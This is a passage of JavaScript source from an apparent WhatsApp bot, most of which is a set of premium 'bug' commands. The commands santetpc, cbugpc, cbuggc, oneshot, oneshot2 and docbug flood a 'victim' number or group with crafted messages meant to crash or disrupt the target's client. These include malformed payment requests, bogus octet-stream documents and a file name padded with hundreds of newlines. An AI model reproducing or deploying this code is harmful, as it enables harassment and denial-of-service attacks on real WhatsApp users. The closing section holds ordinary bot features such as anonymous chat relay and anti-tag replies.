thumbnailUrl: 'https://i.ibb.co/T1jCqF4/IMG-20221024-WA0002.jpg', 
}
}}}}}, { quoted:doc})
}
}
break
case 'santetpc': {
if (!isPremium && !isCreator) return reply(mess.premi)
if (!q) return reply(`Contoh ${command} 6281297970769`)
nmn = q.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net"
if (Input == isCreator) return reply('Tidak Bisa, Karena Itu Nomer Developer')
for (let i = 0; i < jumlah; i++) {
XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, { text: '' })
await sleep(1000)
}
reply(`Bug Santet Telah Dikirim Ke: *${text}*`)
}
break
case 'cbugpc': {
	if (!isPremium && !isCreator) return reply(mess.premi)
if (args.length < 1) return m.reply(`*Error!*\n\nUse : ${command} victim number|spam amount|timer\nExample : ${command} 916909s.whatsapp.net|1|10s\n\n\ns = Second\n\n`)
num = q.split('.')[0]
jumlah = q.split('.')[1]
if (jumlah >= 5) return reply(`_Jumlah Maksimal 5_`)
for (let i = 0; i < jumlah; i++) {
m.reply(`Okay sir!`)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./XBug/xpic.jpeg') }, { upload: XeonBotInc.waUploadToServer })
var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendedTextMessage": {
"text": botname,
}
}}), { userJid: m.chat, quoted: doc})
XeonBotInc.relayMessage(`${num}@s.whatsapp.net`, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
m.reply(`Bug Telah Dikirim Ke: *${num}*\nJumlah Spam: *${jumlah}*`)
}
break
case 'cbuggc': {
if (!isPremium && !isCreator) return reply(mess.premi)
if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 916909@g.us|1|10s\n\n\ns = Second\n\nMake sure the bot has entered the group`)
num = q.split('.')[0]
jumlah = q.split('.')[1]
if (jumlah >= 5) return reply(`_Jumlah Maksimal 5_`)
for (let i = 0; i < jumlah; i++) {
m.reply(`Okay sir`)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./XBug/xpic.jpeg') }, { upload: XeonBotInc.waUploadToServer })
var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendedTextMessage": {
"text": `MY DEVELOPER HW MODS WA`,
}
}}), { userJid: m.chat, quoted: doc})
XeonBotInc.relayMessage(`${num}@s.whatsapp.net`, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
m.reply(`Bug Telah Dikirim Ke: *${num}*\nJumlah Spam: *${jumlah}*`)
}
break
case 'oneshot': {
if (!isPremium && !isCreator) return reply(mess.premi)
bwa = q.split('.')[0]
jumlah = q.split('.')[1]
if (jumlah >= 5) return reply(`_Jumlah Maksimal 5_`)
for (let i = 0; i < jumlah; i++) {
lodaChoos = fs.readFileSync('./XBug/randiKaBaccha.sound')
XeonBotInc.sendMessage(`${bwa}@s.whatsapp.net`, {document: lodaChoos, mimetype: 'application/octet-stream', fileName:`${botname} ${xeonbut2}.sound` }, {quoted:doc})
}
m.reply(`Bug Telah Dikirim Ke: *${bwa}*\nJumlah Spam: *${jumlah}*`)

}
break
case 'oneshot2': {
if (!isPremium && !isCreator) return reply(mess.premi)
bwa = q.split('.')[0]
jumlah = q.split('.')[1]
if (jumlah >= 5) return reply(`_Jumlah Maksimal 5_`)
for (let i = 0; i < jumlah; i++) {
 lodaChoos2 = fs.readFileSync('./XBug/randiKaBaccha.sound')
 XeonBotInc.sendMessage(`${bwa}@s.whatsapp.net`, {document: lodaChoos2, mimetype: '', fileName:`${botname} ${xeonbut2}.sound` }, {quoted:doc})
 }
 m.reply(`Bug Telah Dikirim Ke: *${bwa}*\nJumlah Spam: *${jumlah}*`)

 }
 break
case 'docbug': {
if (!isPremium && !isCreator) return reply(mess.premi)
num = q.split('.')[0]
jumlah = q.split('.')[1]
if (jumlah >= 5) return reply(`_Jumlah Maksimal 5_`)
for (let i = 0; i < jumlah; i++) {
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({	
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": botname,
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `ðŸ¦„${ownername}ðŸ¦„\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${xeonbut2}.sound`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
}
}), { userJid: m.chat })
XeonBotInc.relayMessage(`${bwa}@s.whatsapp.net`, document.message, { messageId: document.key.id })
}
m.reply(`Bug Telah Dikirim Ke: *${bwa}*\nJumlah Spam: *${jumlah}*`)

}
break


if (m.chat.endsWith('@s.whatsapp.net') && isCmd) {
                    this.anonymous = this.anonymous ? this.anonymous : {}
                    let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
                    if (room) {
                        if (/^.*(next|leave|start)/.test(m.text)) return
                        if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
                        let other = [room.a, room.b].find(user => user !== m.sender)
                        m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
                            contextInfo: {
                                ...m.msg.contextInfo,
                                forwardingScore: 0,
                                isForwarded: true,
                                participant: other
                            }
                        } : {})
                    }
                    return !0
                }
                
			//anti-tag
const listTag = [`${global.ownertag}@s.whatsapp.net`]
const partiNum = (m.mtype === 'extendedTextMessage') ? m.message.extendedTextMessage.contextInfo : ''
//anti-tag 2
if (listTag.includes(partiNum)) {
if (antitags === false) return
if (!m.isGroup) return
if (m.key.fromMe) return
sendNye = fs.readFileSync('./XeonMedia/theme/yourtag.webp')
XeonBotInc.sendReadReceipt(m.chat, m.sender, [m.key.id])
XeonBotInc.sendMessage(from, {sticker:sendNye, contextInfo:{forwardingScore: 800, isForwarded: true}}, {quoted:m})
}
//anti-tag 3
if (budy.includes(`${global.ownertag}`)) {
if (antitags === false) return
if (!m.isGroup) return
if (m.key.fromMe) return
sendNye = fs.readFileSync('./XeonMedia/theme/yourtag.webp')
XeonBotInc.sendReadReceipt(m.chat, m.sender, [m.key.id])
XeonBotInc.sendMessage(from, {sticker:sendNye, contextInfo:{forwardingScore: 800, isForwarded: true}}, {quoted:m})
}
		if (isCmd && budy.toLowerCase() != undefined) {
		    if (m.chat.endsWith('broadcast')) return
		    if (m.isBaileys) return
		    let msgs = global.db.data.database
		    if (!(budy.toLowerCase() in msgs)) return
		    XeonBotInc.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
		}
        }
        
}catch (err) {
        m.reply(util.format(err))
    }
}
   

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})
